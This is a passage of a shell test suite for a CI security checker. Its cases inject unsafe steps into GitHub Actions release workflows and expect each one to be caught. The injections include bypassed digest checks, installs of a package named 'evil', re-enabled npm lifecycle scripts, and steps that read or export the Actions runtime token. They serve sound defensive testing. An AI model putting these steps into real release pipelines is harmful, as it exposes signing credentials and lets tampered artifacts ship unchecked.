	expect_caught 'npm version by an abbreviation, without --ignore-scripts (#1046)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'            npm version "${VERSION}" --no-git-tag-version --allow-same-version --ignore-scripts' '            npm vers "${VERSION}" --no-git-tag-version --allow-same-version' \
		'publish-sidecar: runs npm vers without --ignore-scripts'
	expect_caught 'the npm version alias verison, without --ignore-scripts (#1046)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'            npm version "${VERSION}" --no-git-tag-version --allow-same-version --ignore-scripts' '            cd x && npm verison "${VERSION}" --no-git-tag-version' \
		'publish-sidecar: runs npm verison without --ignore-scripts'
	# Security review of #1046: the flag turned off again, an option that
	# hides the verb, and the workspace walk of npm version.
	expect_caught 'npm publish with --ignore-scripts false (#1046 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'            npm publish --access public --ignore-scripts "${flags[@]}"' '            npm publish --access public --ignore-scripts false "${flags[@]}"' \
		'publish-sidecar: runs npm publish with --ignore-scripts given a value or negated'
	expect_caught 'npm publish with --ignore-scripts then --no-ignore-scripts (#1046 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'            npm publish --access public --ignore-scripts "${flags[@]}"' '            npm publish --access public --ignore-scripts --no-ignore-scripts "${flags[@]}"' \
		'publish-sidecar: runs npm publish with --ignore-scripts given a value or negated'
	expect_caught 'npm publish with an abbreviated --no-ignore-script (#1046 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'            npm publish --access public --ignore-scripts "${flags[@]}"' '            npm publish --access public --ignore-scripts --no-ignore-script "${flags[@]}"' \
		'publish-sidecar: runs npm publish with --ignore-scripts given a value or negated'
	expect_caught 'npm publish with a short --no-ign (#1046 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'            npm publish --access public --ignore-scripts "${flags[@]}"' '            npm publish --access public --ignore-scripts --no-ign "${flags[@]}"' \
		'publish-sidecar: runs npm publish with --ignore-scripts given a value or negated'
	expect_caught 'npm publish with --ignore-script=false after the flag (#1046 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'            npm publish --access public --ignore-scripts "${flags[@]}"' '            npm publish --access public --ignore-scripts --ignore-script=false "${flags[@]}"' \
		'publish-sidecar: runs npm publish with --ignore-scripts given a value or negated'
	expect_caught 'npm version with --ignore-scripts=false (#1046 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'            npm version "${VERSION}" --no-git-tag-version --allow-same-version --ignore-scripts' '            npm version "${VERSION}" --no-git-tag-version --allow-same-version --ignore-scripts=false' \
		'publish-sidecar: runs npm version with --ignore-scripts given a value or negated'
	expect_caught 'an option with a value before the npm verb (#1046 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'            npm publish --access public --ignore-scripts "${flags[@]}"' '            npm --loglevel warn publish --access public "${flags[@]}"' \
		'publish-sidecar: runs npm with an option before its command'
	expect_caught 'npm version walking up to a workspace root (#1046 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'--allow-same-version --ignore-scripts --workspaces=false' '--allow-same-version --ignore-scripts' \
		'publish-sidecar: runs npm version without --workspaces=false'
	expect_caught 'the digest check removed before the publish' narrow "$WORKFLOWS/release-exec.yml" \
		'brain-pack/${TARBALL}" | sha256sum -c -' 'brain-pack/${TARBALL}" | cat'
	expect_caught 'another global package installed in the npm publish job' narrow "$WORKFLOWS/release-exec.yml" \
		'      - name: Verify the tarball' $'      - run: npm install -g evil@1.0.0\n      - name: Verify the tarball' \
		'installs something other than npm'
	expect_caught 'a node script run in the npm publish job' narrow "$WORKFLOWS/release-exec.yml" \
		'      - name: Verify the tarball' $'      - run: node scripts/x.js\n      - name: Verify the tarball' \
		'publishes with id-token and runs'
	expect_caught 'the Windows build back in the job that signs with id-token' narrow "$WORKFLOWS/sidecar-release.yml" \
		'      - name: Windows signing readiness' $'      - run: ../.github/scripts/build-sidecar.sh\n      - name: Windows signing readiness'
	expect_caught 'a global install with the flag after the package' narrow "$WORKFLOWS/release-exec.yml" \
		'      - name: Verify the tarball' $'      - run: npm install evil@1.0.0 -g\n      - name: Verify the tarball' \
		'installs something other than npm'
	expect_caught 'npm test in the npm publish job' narrow "$WORKFLOWS/release-exec.yml" \
		'      - name: Verify the tarball' $'      - run: npm test\n      - name: Verify the tarball' \
		'publishes with id-token and runs'
	expect_caught 'a command behind sudo in the npm publish job' narrow "$WORKFLOWS/release-exec.yml" \
		'      - name: Verify the tarball' $'      - run: sudo node x.js\n      - name: Verify the tarball' \
		'publishes with id-token and runs'
	expect_caught 'a non-shell step in the npm publish job' narrow "$WORKFLOWS/release-exec.yml" \
		'      - name: Verify the tarball' $'      - shell: node {0}\n        run: console.log(1)\n      - name: Verify the tarball' \
		'step with shell:'
	expect_caught 'go test in the job that signs with id-token' narrow "$WORKFLOWS/sidecar-release.yml" \
		'      - name: Windows signing readiness' $'      - run: go test ./...\n      - name: Windows signing readiness'
	expect_caught 'a local action in the job that signs with id-token' narrow "$WORKFLOWS/sidecar-release.yml" \
		'      - name: Windows signing readiness' $'      - uses: ./.github/actions/bun-setup\n      - name: Windows signing readiness'
	expect_caught 'the Google credentials file left in the workspace' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'          create_credentials_file: false\n' ''
	expect_caught 'node behind an if, in the npm publish job' narrow "$WORKFLOWS/release-exec.yml" \
		'      - name: Verify the tarball' $'      - run: if node x.js; then true; fi\n      - name: Verify the tarball' \
		'publishes with id-token and runs'
	expect_caught 'node behind an assignment and a path, in the npm publish job' narrow "$WORKFLOWS/release-exec.yml" \
		'      - name: Verify the tarball' $'      - run: X=1 /usr/bin/node evil.js\n      - name: Verify the tarball' \
		'publishes with id-token and runs'
	expect_caught 'a digest check allowed to fail (#781 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'      - name: Verify the binary\n' $'      - name: Verify the binary\n        continue-on-error: true\n' \
		'continue-on-error on "Verify the binary"'
	expect_caught 'a digest check that hashes the file against itself, the digest left unread (#781 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'          [[ "$SHA256" =~ ^[0-9a-f]{64}$ ]] || { echo "::error::build-sidecar-windows reported no digest"; exit 1; }\n          in="${RUNNER_TEMP}/unsigned"\n          if [ "$(find "$in" -mindepth 1 -print)" != "${in}/${SIDECAR_BIN}.exe" ] || [ -L "${in}/${SIDECAR_BIN}.exe" ] || [ ! -f "${in}/${SIDECAR_BIN}.exe" ]; then\n            echo "::error::the unsigned-win32-x64 artifact is not exactly one file, ${SIDECAR_BIN}.exe"\n            exit 1\n          fi\n          echo "${SHA256}  ${in}/${SIDECAR_BIN}.exe" | sha256sum -c -' \
		$'          in="${RUNNER_TEMP}/unsigned"\n          sha256sum "${in}/${SIDECAR_BIN}.exe" | sha256sum -c -' \
		'has a needs.<job>.outputs digest in env that its check never reads'
	expect_caught 'a digest check whose failure is excused (#781 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'echo "${SHA256}  ${in}/${SIDECAR_BIN}.exe" | sha256sum -c -' 'echo "${SHA256}  ${in}/${SIDECAR_BIN}.exe" | sha256sum -c - || true' \
		'failure excused'
	expect_caught 'a digest check excused with || echo (#781 re-review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'echo "${SHA256}  ${in}/${SIDECAR_BIN}.exe" | sha256sum -c -' 'echo "${SHA256}  ${in}/${SIDECAR_BIN}.exe" | sha256sum -c - || echo ignored' \
		'failure excused'
	expect_caught 'a digest check wrapped in if ! (#781 re-review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'          echo "${SHA256}  ${in}/${SIDECAR_BIN}.exe" | sha256sum -c -' '          if ! echo "${SHA256}  ${in}/${SIDECAR_BIN}.exe" | sha256sum -c -; then echo ignored; fi' \
		'failure excused'
	expect_caught 'a digest check after set +e (#781 re-review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'          echo "${SHA256}  ${in}/${SIDECAR_BIN}.exe" | sha256sum -c -' $'          set +e\n          echo "${SHA256}  ${in}/${SIDECAR_BIN}.exe" | sha256sum -c -\n          true' \
		'failure excused'
	expect_caught 'a digest check excused on the next line (#781 re-review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'          echo "${SHA256}  ${in}/${SIDECAR_BIN}.exe" | sha256sum -c -' $'          echo "${SHA256}  ${in}/${SIDECAR_BIN}.exe" | sha256sum -c - ||\n            true' \
		'failure excused'
	expect_caught 'a digest check piped into cat, without pipefail (#781 second re-review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'          echo "${SHA256}  ${in}/${SIDECAR_BIN}.exe" | sha256sum -c -' '          echo "${SHA256}  ${in}/${SIDECAR_BIN}.exe" | sha256sum -c - | cat' \
		'failure excused'
	expect_caught 'a digest check swallowed by a command substitution (#781 second re-review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'          echo "${SHA256}  ${in}/${SIDECAR_BIN}.exe" | sha256sum -c -' '          echo "$(echo "${SHA256}  ${in}/${SIDECAR_BIN}.exe" | sha256sum -c -)"' \
		'failure excused'
	expect_caught 'a digest check sent to the background (#781 second re-review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'          echo "${SHA256}  ${in}/${SIDECAR_BIN}.exe" | sha256sum -c -' '          echo "${SHA256}  ${in}/${SIDECAR_BIN}.exe" | sha256sum -c - &' \
		'failure excused'
	expect_caught 'pipefail switched off before the digest check (#781 second re-review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'          echo "${SHA256}  ${in}/${SIDECAR_BIN}.exe" | sha256sum -c -' $'          set +o pipefail\n          echo "${SHA256}  ${in}/${SIDECAR_BIN}.exe" | sha256sum -c -' \
		'failure excused'
	expect_caught 'the download action spelled in another case, used before its check (#781 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2\n        with:\n          name: unsigned-win32-x64\n          path: ${{ runner.temp }}/unsigned\n' \
		$'      - uses: Actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2\n        with:\n          name: unsigned-win32-x64\n          path: ${{ runner.temp }}/unsigned\n      - run: ls sidecar\n' \
		'is not followed at once by a sha256sum -c'
	expect_caught 'an artifact fetched with gh run download in a signing job (#781 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'      - name: Windows signing readiness' $'      - run: gh run download "$GITHUB_RUN_ID" -n unsigned-win32-x64\n      - name: Windows signing readiness' \
		'fetches artifacts outside actions/download-artifact'
	expect_caught 'a package install inside a brace group (#817 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'      - name: Windows signing readiness' $'      - run: |\n          { sudo apt-get install -y osslsigncode; }\n      - name: Windows signing readiness' \
		'installs OS packages in a job holding id-token'
	expect_caught 'a package install behind sudo -u (#817 review)' narrow "$WORKFLOWS/installer-release.yml" \
		'      - name: Windows signing readiness' $'      - run: |\n          sudo -u root apt-get install -y osslsigncode\n      - name: Windows signing readiness' \
		'installs OS packages in a job holding id-token'
	expect_caught 'a package install after a quoted hash, which is not a comment (#817 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'      - name: Windows signing readiness' $'      - run: |\n          echo "step #1"; sudo apt-get install -y osslsigncode\n      - name: Windows signing readiness' \
		'installs OS packages in a job holding id-token'
	expect_caught 'pip run as a python module in the npm publish job (#817 review)' narrow "$WORKFLOWS/release-exec.yml" \
		'      - name: Ensure npm supports Trusted Publishing' $'      - run: |\n          python3 -m pip install --user something\n      - name: Ensure npm supports Trusted Publishing' \
		'installs OS packages in a job holding id-token'
	expect_caught 'a package install handed to a shell as text (#817 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'      - name: Ensure npm supports Trusted Publishing' $'      - run: |\n          bash -c "apt-get install -y jq"\n      - name: Ensure npm supports Trusted Publishing' \
		'runs shell text in a job holding id-token'
	expect_caught 'a package-install action in a signing job (#817 review)' narrow "$WORKFLOWS/installer-release.yml" \
		'      - name: Windows signing readiness' $'      - uses: awalsh128/cache-apt-pkgs-action@2c09a5e66da6c8016428a2172bd76e5e4f14bb17\n        with:\n          packages: osslsigncode\n      - name: Windows signing readiness' \
		'uses awalsh128/cache-apt-pkgs-action@2c09a5e66da6c8016428a2172bd76e5e4f14bb17 in a job holding id-token'
	expect_caught 'the sidecar signing input extracted over the checkout again (#817 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'          name: unsigned-win32-x64\n          path: ${{ runner.temp }}/unsigned\n' $'          name: unsigned-win32-x64\n          path: sidecar\n' \
		'sign-sidecar-windows: downloads "unsigned-win32-x64" into "sidecar", over the checkout'
	expect_caught 'the installer signing input downloaded to the default path, the workspace (#817 review)' narrow "$WORKFLOWS/installer-release.yml" \
		$'          name: unsigned-installer-win32-x64\n          path: ${{ runner.temp }}/unsigned\n' $'          name: unsigned-installer-win32-x64\n' \
		'sign-windows: downloads "unsigned-installer-win32-x64" into "the workspace"'
	expect_caught 'the installer signature check reading its input from inside the checkout (#817 review)' narrow "$WORKFLOWS/installer-release.yml" \
		$'          name: installer-win32-x64\n          path: ${{ runner.temp }}/signed\n' $'          name: installer-win32-x64\n          path: ./sidecar/in\n' \
		'verify-windows: downloads "installer-win32-x64" into "./sidecar/in"'
	expect_caught 'a download that climbs out of runner.temp back into the checkout (#817 review)' narrow "$WORKFLOWS/installer-release.yml" \
		$'          name: installer-win32-x64\n          path: ${{ runner.temp }}/signed\n' $'          name: installer-win32-x64\n          path: ${{ runner.temp }}/../work/jarvis/jarvis/sidecar\n' \
		'verify-windows: downloads "installer-win32-x64" into "${{ runner.temp }}/../work'
	expect_caught 'a download into the home directory (#817 review)' narrow "$WORKFLOWS/installer-release.yml" \
		$'          name: installer-win32-x64\n          path: ${{ runner.temp }}/signed\n' $'          name: installer-win32-x64\n          path: ~/in\n' \
		'verify-windows: downloads "installer-win32-x64" into "~/in"'
	expect_caught 'a release-path download into the workspace root (#817 review)' narrow "$WORKFLOWS/release-exec.yml" \
		$'          path: artifacts\n          pattern: sidecar-*\n' $'          path: .\n          pattern: sidecar-*\n' \
		'github-release: downloads "sidecar-*" into "."'
	expect_caught 'osslsigncode installed from apt back in the sidecar signing job (#817)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'      - name: Windows signing readiness' $'      - name: Install osslsigncode\n        run: |\n          sudo apt-get update\n          sudo apt-get install -y osslsigncode\n      - name: Windows signing readiness' \
		'installs OS packages in a job holding id-token'
	expect_caught 'osslsigncode installed from apt back in the installer signing job (#817)' narrow "$WORKFLOWS/installer-release.yml" \
		'      - name: Windows signing readiness' $'      - run: sudo apt install -y osslsigncode\n      - name: Windows signing readiness' \
		'installs OS packages in a job holding id-token'
	expect_caught 'a package install behind env and an assignment, in the npm publish job (#817)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'      - name: Ensure npm supports Trusted Publishing' $'      - run: env DEBIAN_FRONTEND=noninteractive dpkg -i x.deb\n      - name: Ensure npm supports Trusted Publishing' \
		'installs OS packages in a job holding id-token'
	expect_caught 'a pip install in the brain npm publish job (#817)' narrow "$WORKFLOWS/release-exec.yml" \
		'      - name: Ensure npm supports Trusted Publishing' $'      - run: pip3 install --user something\n      - name: Ensure npm supports Trusted Publishing' \
		'installs OS packages in a job holding id-token'
	expect_caught 'the runtime artifact service called directly from a signing job (#820)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'      - name: Windows signing readiness' $'      - run: |\n          curl -fsS -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" "${ACTIONS_RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts"\n      - name: Windows signing readiness' \
		'reads the Actions runtime artifact API'
	expect_caught 'the runtime token handed to a step through env (#820)' narrow "$WORKFLOWS/installer-release.yml" \
		$'          ALLOW_UNSIGNED_WINDOWS: ${{ vars.ALLOW_UNSIGNED_WINDOWS }}\n        run: |\n' \
		$'          ALLOW_UNSIGNED_WINDOWS: ${{ vars.ALLOW_UNSIGNED_WINDOWS }}\n          URL: ${{ env.ACTIONS_RESULTS_URL }}\n        run: |\n' \
		'reads the Actions runtime artifact API'
	expect_caught 'the runtime URL in a signing job env (#820)' narrow "$WORKFLOWS/installer-release.yml" \
		$'    steps:\n      # For scripts/sign-windows.sh and the committed certificate chain.' \
		$'    env:\n      R: ${{ env.ACTIONS_RUNTIME_URL }}\n    steps:\n      # For scripts/sign-windows.sh and the committed certificate chain.' \
		'job env reads the Actions runtime artifact API'
	expect_caught 'github-script reading the runtime token, no artifact word in sight (#820)' narrow "$WORKFLOWS/release-exec.yml" \
		'      - name: Verify the tarball' $'      - uses: actions/github-script@ed597411d8f924073f98dfc5c65a23a2325f34cd\n        with:\n          script: return process.env.ACTIONS_RUNTIME_TOKEN\n      - name: Verify the tarball' \
		'reads the Actions runtime artifact API'
	expect_caught 'a third-party artifact download action in the npm publish job (#820)' narrow "$WORKFLOWS/release-exec.yml" \
		'      - name: Verify the tarball' $'      - uses: dawidd6/action-download-artifact@ac66b43f0e6a346234dd65d4d0c8fbb31cb316e5\n        with:\n          name: brain-tarball\n      - name: Verify the tarball' \
		'fetches artifacts through dawidd6/action-download-artifact'
	expect_caught 'an action that exports the runtime token to later steps, in a signing job (#820)' narrow "$WORKFLOWS/installer-release.yml" \
		'      - name: Windows signing readiness' $'      - uses: crazy-max/ghaction-github-runtime@3cb05d89e1f492524af3d41a1c98c83bc3025124\n      - name: Windows signing readiness' \
		'fetches artifacts through crazy-max/ghaction-github-runtime'
	expect_caught 'publish-sidecar using the artifacts before checking them (#781)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'      - name: Verify sidecar artifacts' $'      - run: ls artifacts\n      - name: Verify sidecar artifacts' \
		'is not followed at once by a sha256sum -c'
	expect_caught 'the signer checking the binary against something other than a job output (#781)' narrow "$WORKFLOWS/sidecar-release.yml" \
		'          SHA256: ${{ needs.build-sidecar-windows.outputs.sha256 }}' '          SHA256: ${{ vars.EXPECTED_SHA256 }}' \
		'is checked against no needs.<job>.outputs digest'
	expect_caught 'the release attaching sidecar binaries whose check can be switched off alone (#781)' narrow "$WORKFLOWS/release-exec.yml" \
		$'      - name: Verify sidecar binaries\n        if: needs.publish-sidecar.outputs.released == \'true\'' $'      - name: Verify sidecar binaries\n        if: false' \
		'is checked under a different condition'
	# #952 follow-up: publish-sidecar downloads its five artifacts by name,
	# one step each, checked by the one step after the run.
	expect_caught 'a step run inside the run of sidecar downloads, before the check (#952)' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'          path: artifacts/sidecar-linux-arm64\n\n      - name: Download sidecar-darwin-arm64\n' $'          path: artifacts/sidecar-linux-arm64\n\n      - run: ls artifacts\n\n      - name: Download sidecar-darwin-arm64\n' \
		'download "sidecar-linux-x64" is not followed at once by a sha256sum -c'
	expect_caught 'one download of the run under a condition of its own (#952)' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'      - name: Download sidecar-darwin-arm64\n' $'      - name: Download sidecar-darwin-arm64\n        if: always()\n' \
		'download "sidecar-darwin-arm64" is checked under a different condition'
	expect_caught 'one download of the run allowed to fail (#952)' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'      - name: Download sidecar-darwin-x64\n' $'      - name: Download sidecar-darwin-x64\n        continue-on-error: true\n' \
		'download "sidecar-darwin-x64": continue-on-error on'
	expect_caught 'a download slipped in front of the npm publish job tarball download, which its check never looks at (#952 review)' narrow "$WORKFLOWS/release-exec.yml" \
		$'          name: brain-tarball\n          path: ${{ runner.temp }}/brain-pack\n' $'          name: brain-tarball\n          path: ${{ runner.temp }}/brain-pack\n      - uses: actions/download-artifact@0000000000000000000000000000000000000000 # v0\n        with:\n          name: other\n          path: ${{ runner.temp }}/other\n' \
		'download "other" sits in a run of downloads'
	expect_caught 'a sixth download in the sidecar run that the check never names (#952 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'          path: artifacts/sidecar-win32-x64\n' $'          path: artifacts/sidecar-win32-x64\n      - uses: actions/download-artifact@0000000000000000000000000000000000000000 # v0\n        with:\n          name: extra\n          path: extra\n' \
		'download "extra" sits in a run of downloads'
	expect_caught 'a sidecar download in the run by glob, not by name (#952 review)' narrow "$WORKFLOWS/sidecar-release.yml" \
		$'          name: sidecar-linux-x64\n          path: artifacts/sidecar-linux-x64\n' $'          pattern: sidecar-*\n          path: artifacts\n' \
		'download "sidecar-*" sits in a run of downloads'
	expect_caught 'the npm publish job doing something between the tarball download and its check (#781)' narrow "$WORKFLOWS/release-exec.yml" \
		'      - name: Verify the tarball' $'      - run: ls\n      - name: Verify the tarball' \
		'is not followed at once by a sha256sum -c'
	expect_caught 'the installer build back in the job that signs with id-token (#779)' narrow "$WORKFLOWS/installer-release.yml" \
		'      - name: Windows signing readiness' $'      - run: go build -o Jarvis-Setup.exe ./installer/\n      - name: Windows signing readiness' \
		'builds in a job holding id-token'
	expect_caught 'id-token back on the installer build job (#779)' narrow "$WORKFLOWS/installer-release.yml" \
		$'    permissions:\n      contents: read\n    outputs:' $'    permissions:\n      contents: read\n      id-token: write\n    outputs:' \
		'build-windows: builds in a job holding id-token'
	expect_caught 'the installer Google credentials file left in the workspace (#779)' narrow "$WORKFLOWS/installer-release.yml" \
		$'          create_credentials_file: false\n' '' \
		'create_credentials_file is not false'
	expect_caught 'an installer checkout leaving its token in .git/config (#779)' narrow "$WORKFLOWS/installer-release.yml" \
		$'        with:\n          persist-credentials: false\n      - id: v' $'      - id: v' \
		'resolve: checkout leaves the token'
	expect_caught 'the installer signer using the build before checking it (#779)' narrow "$WORKFLOWS/installer-release.yml" \
		$'      - name: Verify the installer\n' $'      - run: ls sidecar\n      - name: Verify the installer\n' \
		'sign-windows: download "unsigned-installer-win32-x64" is not followed at once'
	expect_caught 'the installer release publishing artifacts it has not checked (#779)' narrow "$WORKFLOWS/installer-release.yml" \
		'      - name: Verify the installers' $'      - run: ls artifacts\n      - name: Verify the installers' \
		'publish: download "installer-*" is not followed at once'
	expect_caught 'a registry login on a dry run' narrow "$WORKFLOWS/release-exec.yml" \
		$'        if: env.DRY_RUN != \'true\'\n        uses: docker/login-action@' $'        uses: docker/login-action@'
}
echo
echo "the catalog sync license-checks what the shared build would install, every week (#971)"
expect_clean "sync-pieces-catalog.yml: one unconditional license scan of the regenerated catalog" \
	license-scan "$WORKFLOWS/sync-pieces-catalog.yml"
expect_caught 'the license scan removed' license-scan "$WORKFLOWS/sync-pieces-catalog.yml" \
	'        run: bun run scripts/check-piece-licenses.ts --install' '        run: echo skipped scripts/check-piece-licenses --install' \
	'expected exactly one license scan step'
expect_caught 'the license scan allowed to fail' license-scan "$WORKFLOWS/sync-pieces-catalog.yml" \
	'      - name: License-check the shared pieces tree' $'      - name: License-check the shared pieces tree\n        continue-on-error: true' \
	'may fail without failing the run'
expect_caught 'the license scan job allowed to fail' license-scan "$WORKFLOWS/sync-pieces-catalog.yml" \
	$'  licenses:\n    needs: generate\n' $'  licenses:\n    needs: generate\n    continue-on-error: true\n' \
	'may fail without failing the run'
expect_caught 'the license scan only when the catalog changed' license-scan "$WORKFLOWS/sync-pieces-catalog.yml" \
	$'  licenses:\n    needs: generate\n' $'  licenses:\n    needs: generate\n    if: needs.generate.outputs.has_changes == \x27true\x27\n' \
	'is conditional'
expect_caught 'the license scan failure swallowed' license-scan "$WORKFLOWS/sync-pieces-catalog.yml" \
	'--summary-md "$GITHUB_STEP_SUMMARY"' '--summary-md "$GITHUB_STEP_SUMMARY" || true' \
	'runs something besides the scan'
expect_caught 'the license scan on the committed catalog' license-scan "$WORKFLOWS/sync-pieces-catalog.yml" \
	'        run: cp "$RUNNER_TEMP/catalog-sync/catalog-generated.ts" src/workflows/pieces-library/catalog-generated.ts' '        run: ls "$RUNNER_TEMP/catalog-sync"' \
	'does not put the regenerated catalog in place'
expect_caught 'the license scan failure swallowed with an echo' license-scan "$WORKFLOWS/sync-pieces-catalog.yml" \
	'--summary-md "$GITHUB_STEP_SUMMARY"' '--summary-md "$GITHUB_STEP_SUMMARY" || echo failed' \
	'runs something besides the scan'
expect_caught 'the license scan behind an earlier command that ends the step' license-scan "$WORKFLOWS/sync-pieces-catalog.yml" \
	'        run: bun run scripts/check-piece-licenses.ts --install' '        run: true || bun run scripts/check-piece-licenses.ts --install' \
	'runs something besides the scan'
expect_caught 'the regenerated catalog put in place only sometimes' license-scan "$WORKFLOWS/sync-pieces-catalog.yml" \
	'      - name: Use the regenerated catalog' $'      - name: Use the regenerated catalog\n        if: false' \
	'putting the regenerated catalog in place is conditional'
expect_caught 'the regenerated catalog put in place allowed to fail' license-scan "$WORKFLOWS/sync-pieces-catalog.yml" \
	'      - name: Use the regenerated catalog' $'      - name: Use the regenerated catalog\n        continue-on-error: true' \
	'putting the regenerated catalog in place may fail'
expect_caught 'the regenerated catalog copy with its failure swallowed' license-scan "$WORKFLOWS/sync-pieces-catalog.yml" \
	'src/workflows/pieces-library/catalog-generated.ts

      # Installs' 'src/workflows/pieces-library/catalog-generated.ts || true

      # Installs' \
	'runs something besides the copy'
expect_caught 'the regenerated catalog put in place after the scan' license-scan "$WORKFLOWS/sync-pieces-catalog.yml" \
	$'      - name: Use the regenerated catalog\n        run: cp "$RUNNER_TEMP/catalog-sync/catalog-generated.ts" src/workflows/pieces-library/catalog-generated.ts\n\n      # Installs into a fresh directory, the way scripts/build-shared-runtime.ts\n      # installs the hosted tree, then applies the same gate. Exit 1 names\n      # every denied package and the chain that installed it.\n      - name: License-check the shared pieces tree\n        run: bun run scripts/check-piece-licenses.ts --install "$RUNNER_TEMP/license-scan" --summary-md "$GITHUB_STEP_SUMMARY"\n' \
	$'      - name: License-check the shared pieces tree\n        run: bun run scripts/check-piece-licenses.ts --install "$RUNNER_TEMP/license-scan" --summary-md "$GITHUB_STEP_SUMMARY"\n      - name: Use the regenerated catalog\n        run: cp "$RUNNER_TEMP/catalog-sync/catalog-generated.ts" src/workflows/pieces-library/catalog-generated.ts\n' \
	'does not put the regenerated catalog in place first'
expect_caught 'the generated catalog downloaded only sometimes' license-scan "$WORKFLOWS/sync-pieces-catalog.yml" \
	$'      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2\n        with:\n          name: catalog-sync\n          path: ${{ runner.temp }}/catalog-sync\n\n      - name: Use the regenerated catalog' \
	$'      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2\n        if: false\n        with:\n          name: catalog-sync\n          path: ${{ runner.temp }}/catalog-sync\n\n      - name: Use the regenerated catalog' \
	'downloading the generated catalog is conditional'
expect_caught 'the license scan scanning without installing' license-scan "$WORKFLOWS/sync-pieces-catalog.yml" \
	'check-piece-licenses.ts --install' 'check-piece-licenses.ts --dir' \
	'does not install the catalog'
expect_caught 'the license scan run from the write job' untrusted "$WORKFLOWS/sync-pieces-catalog.yml" \
	'      - name: Update or close the review issue' $'      - run: echo go; scripts/check-piece-licenses.ts --dir x\n      - name: Update or close the review issue' \
	'processes third-party data in a job holding'
expect_caught 'an unfrozen install in the catalog sync' untrusted "$WORKFLOWS/sync-pieces-catalog.yml" \
	'run: bun install --frozen-lockfile' 'run: bun install'
expect_caught 'a write scope on the job that runs the catalog generator' untrusted "$WORKFLOWS/sync-pieces-catalog.yml" \
	$'    permissions:\n      contents: read\n    outputs:' $'    permissions:\n      contents: write\n    outputs:'
expect_caught 'the catalog generator run from the job holding the write token' untrusted "$WORKFLOWS/sync-pieces-catalog.yml" \
	'      - name: Put the generated files in place' $'      - run: bun run scripts/sync-pieces-catalog.ts\n      - name: Put the generated files in place'
expect_caught 'a local action that installs dependencies, used from the job holding the write token' untrusted "$WORKFLOWS/sync-pieces-catalog.yml" \
	'      - name: Put the generated files in place' $'      - uses: ./.github/actions/bun-setup\n      - name: Put the generated files in place'
expect_caught 'the catalog generator reached through its package.json alias, from the write job' untrusted "$WORKFLOWS/sync-pieces-catalog.yml" \
	'      - name: Put the generated files in place' $'      - run: bun run sync:pieces\n      - name: Put the generated files in place'
expect_caught 'the generator alias after another command, with a flag, from the write job' untrusted "$WORKFLOWS/sync-pieces-catalog.yml" \
	'      - name: Put the generated files in place' $'      - run: bun --version && bun run --silent sync:pieces\n      - name: Put the generated files in place'
expect_caught 'the generator alias quoted, behind a flag with a value, from the write job' untrusted "$WORKFLOWS/sync-pieces-catalog.yml" \
	'      - name: Put the generated files in place' $'      - run: npm --prefix . run "sync:pieces"\n      - name: Put the generated files in place'
expect_caught 'the generator alias with a flag on both sides, from the write job' untrusted "$WORKFLOWS/sync-pieces-catalog.yml" \
	'      - name: Put the generated files in place' $'      - run: bun run --silent sync:pieces --x\n      - name: Put the generated files in place'
expect_caught 'an install handed to a shell, from the write job' untrusted "$WORKFLOWS/sync-pieces-catalog.yml" \
	'      - name: Put the generated files in place' $'      - run: bash -c "bun install --frozen-lockfile"\n      - name: Put the generated files in place'
expect_caught 'an install that turns the frozen lockfile off' untrusted "$WORKFLOWS/sync-pieces-catalog.yml" \
	'run: bun install --frozen-lockfile' 'run: bun install --frozen-lockfile=false'
expect_caught 'the catalog write job leaving its token in .git/config (#821)' untrusted "$WORKFLOWS/sync-pieces-catalog.yml" \
	$'GH_TOKEN from its step env.\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        with:\n          persist-credentials: false\n' \
	$'GH_TOKEN from its step env.\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        with:\n          persist-credentials: true\n' \
	'publish: checkout leaves the write token in .git/config'
expect_caught 'the catalog write job checking out with the default, which persists (#821)' untrusted "$WORKFLOWS/sync-pieces-catalog.yml" \
